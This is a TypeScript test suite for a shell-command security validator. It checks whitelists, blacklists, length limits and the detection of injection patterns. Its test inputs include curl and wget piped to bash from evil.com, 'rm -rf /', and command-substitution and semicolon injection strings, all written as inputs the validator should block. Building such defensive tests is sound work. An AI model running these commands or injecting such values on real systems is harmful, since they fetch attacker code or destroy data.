/**
 * Security Validator Tests
 */

import {
  SecurityValidator,
  DEFAULT_SECURITY_CONFIG,
} from '../../src/security/validator';

describe('SecurityValidator', () => {
  let validator: SecurityValidator;

  beforeEach(() => {
    validator = new SecurityValidator({
      whitelist: ['ls', 'pwd', 'cat', 'echo'],
      blacklist: ['rm', 'rmdir'],
      allowUnknownCommands: false,
      sanitizeUserInput: true,
      maxCommandLength: 1000,
    });
  });

  describe('validateCommand', () => {
    it('should allow whitelisted commands', () => {
      const result = validator.validateCommand('ls');
      expect(result.valid).toBe(true);
      expect(result.error).toBeUndefined();
    });

    it('should allow whitelisted commands with arguments', () => {
      const result = validator.validateCommand('cat', ['file.txt']);
      expect(result.valid).toBe(true);
    });

    it('should reject blacklisted commands', () => {
      const result = validator.validateCommand('rm');
      expect(result.valid).toBe(false);
      expect(result.error).toContain('blacklisted');
    });

    it('should reject unknown commands when allowUnknownCommands is false', () => {
      const result = validator.validateCommand('unknown-cmd');
      expect(result.valid).toBe(false);
      expect(result.error).toContain('not in the whitelist');
    });

    it('should allow unknown commands when allowUnknownCommands is true', () => {
      const validator2 = new SecurityValidator({
        ...DEFAULT_SECURITY_CONFIG,
        allowUnknownCommands: true,
      });
      const result = validator2.validateCommand('unknown-cmd');
      expect(result.valid).toBe(true);
    });

    it('should reject commands exceeding max length', () => {
      const longString = Array(1000).fill('a').join('');
      const result = validator.validateCommand('echo', [longString]);
      expect(result.valid).toBe(false);
      expect(result.error).toContain('exceeds maximum length');
    });

    it('should reject dangerous patterns', () => {
      const result = validator.validateCommand('cat', ['&&', 'rm', '-rf', '/']);
      expect(result.valid).toBe(false);
    });

    it('should reject shell injection patterns in arguments', () => {
      const result = validator.validateCommand('cat', ['file.txt; rm -rf /']);
      expect(result.valid).toBe(false);
      expect(result.error).toBeDefined();
    });
  });

  describe('shell mode validation', () => {
    it('should allow pipes in shell mode', () => {
      const validator2 = new SecurityValidator({
        ...DEFAULT_SECURITY_CONFIG,
        allowUnknownCommands: true,
      });
      const result = validator2.validateCommand(
        'echo hello | grep hello',
        [],
        true
      );
      expect(result.valid).toBe(true);
    });

    it('should allow && in shell mode', () => {
      const validator2 = new SecurityValidator({
        ...DEFAULT_SECURITY_CONFIG,
        allowUnknownCommands: true,
      });
      const result = validator2.validateCommand(
        'echo first && echo second',
        [],
        true
      );
      expect(result.valid).toBe(true);
    });

    it('should allow $ in shell mode arguments', () => {
      const validator2 = new SecurityValidator({
        ...DEFAULT_SECURITY_CONFIG,
        allowUnknownCommands: true,
      });
      const result = validator2.validateCommand('echo $HOME', [], true);
      expect(result.valid).toBe(true);
    });

    it('should reject curl pipe to bash in shell mode', () => {
      const result = validator.validateCommand(
        'curl http://evil.com | bash',
        [],
        true
      );
      expect(result.valid).toBe(false);
      expect(result.error).toContain('dangerous pattern');
    });

    it('should reject wget pipe to sh in shell mode', () => {
      const result = validator.validateCommand(
        'wget http://evil.com -O - | sh',
        [],
        true
      );
      expect(result.valid).toBe(false);
      expect(result.error).toContain('dangerous pattern');
    });

    it('should reject blacklisted first word in shell mode', () => {
      const validator2 = new SecurityValidator({
        ...DEFAULT_SECURITY_CONFIG,
        allowUnknownCommands: true,
      });
      const result = validator2.validateCommand('kill -9 1234', [], true);
      expect(result.valid).toBe(false);
      expect(result.error).toContain('blacklisted');
    });

    it('should reject rm -rf / in shell mode', () => {
      const validator2 = new SecurityValidator({
        ...DEFAULT_SECURITY_CONFIG,
        allowUnknownCommands: true,
      });
      const result = validator2.validateCommand('rm -rf /', [], true);
      expect(result.valid).toBe(false);
    });

    it('should allow non-blacklisted first word even with complex shell', () => {
      const validator2 = new SecurityValidator({
        ...DEFAULT_SECURITY_CONFIG,
        allowUnknownCommands: true,
      });
      const result = validator2.validateCommand(
        'ls -la /tmp | grep test',
        [],
        true
      );
      expect(result.valid).toBe(true);
    });
  });

  describe('DEFAULT_SECURITY_CONFIG', () => {
    it('should have a populated whitelist', () => {
      expect(DEFAULT_SECURITY_CONFIG.whitelist).toBeDefined();
      expect(DEFAULT_SECURITY_CONFIG.whitelist.length).toBeGreaterThan(0);
    });

    it('should have a populated blacklist', () => {
      expect(DEFAULT_SECURITY_CONFIG.blacklist).toBeDefined();
      expect(DEFAULT_SECURITY_CONFIG.blacklist.length).toBeGreaterThan(0);
    });

    it('should include common safe commands in whitelist', () => {
      const safeCommands = ['ls', 'pwd', 'cat', 'grep', 'git'];
      safeCommands.forEach((cmd) => {
        expect(DEFAULT_SECURITY_CONFIG.whitelist).toContain(cmd);
      });
    });

    it('should include dangerous commands in blacklist', () => {
      const dangerousCommands = [
        'rm',
        'rmdir',
        'dd',
        'sudo',
        'killall',
        'shutdown',
        'reboot',
      ];
      dangerousCommands.forEach((cmd) => {
        expect(DEFAULT_SECURITY_CONFIG.blacklist).toContain(cmd);
      });
    });

    it('should NOT include shell interpreters in blacklist', () => {
      const shellCommands = ['bash', 'sh', 'zsh', 'fish'];
      shellCommands.forEach((cmd) => {
        expect(DEFAULT_SECURITY_CONFIG.blacklist).not.toContain(cmd);
      });
    });

    it('should NOT include curl/wget in blacklist', () => {
      expect(DEFAULT_SECURITY_CONFIG.blacklist).not.toContain('curl');
      expect(DEFAULT_SECURITY_CONFIG.blacklist).not.toContain('wget');
    });

    it('should NOT include shell interpreters in whitelist', () => {
      const shellCommands = ['bash', 'sh', 'zsh', 'fish'];
      shellCommands.forEach((cmd) => {
        expect(DEFAULT_SECURITY_CONFIG.whitelist).not.toContain(cmd);
      });
    });

    it('should NOT include curl/wget in whitelist', () => {
      expect(DEFAULT_SECURITY_CONFIG.whitelist).not.toContain('curl');
      expect(DEFAULT_SECURITY_CONFIG.whitelist).not.toContain('wget');
    });
  });

  describe('non-shell injection detection', () => {
    it('should block semicolons in arguments', () => {
      const result = validator.validateCommand('echo', ['test; rm -rf /']);
      expect(result.valid).toBe(false);
    });

    it('should block backticks in arguments', () => {
      const result = validator.validateCommand('echo', ['`rm -rf /`']);
      expect(result.valid).toBe(false);
    });

    it('should block command substitution in arguments', () => {
      const result = validator.validateCommand('echo', ['$(rm -rf /)']);
      expect(result.valid).toBe(false);
    });

    it('should allow simple arguments without injection', () => {
      const result = validator.validateCommand('echo', ['hello world']);
      expect(result.valid).toBe(true);
    });

    it('should allow dollar sign in arguments when not command substitution', () => {
      const result = validator.validateCommand('echo', ['$5.00']);
      expect(result.valid).toBe(true);
    });

    it('should allow pipe character in arguments (legitimate use)', () => {
      const result = validator.validateCommand('echo', ['a|b']);
      expect(result.valid).toBe(true);
    });

    it('should detect dangerous pipe patterns via findDangerousPattern', () => {
      const validator2 = new SecurityValidator({
        ...DEFAULT_SECURITY_CONFIG,
        allowUnknownCommands: true,
        sanitizeUserInput: false,
      });
      const result = validator2.validateCommand('echo', [
        'curl http://evil.com/payload',
        '|',
        'bash',
      ]);
      expect(result.valid).toBe(false);
    });
  });
});
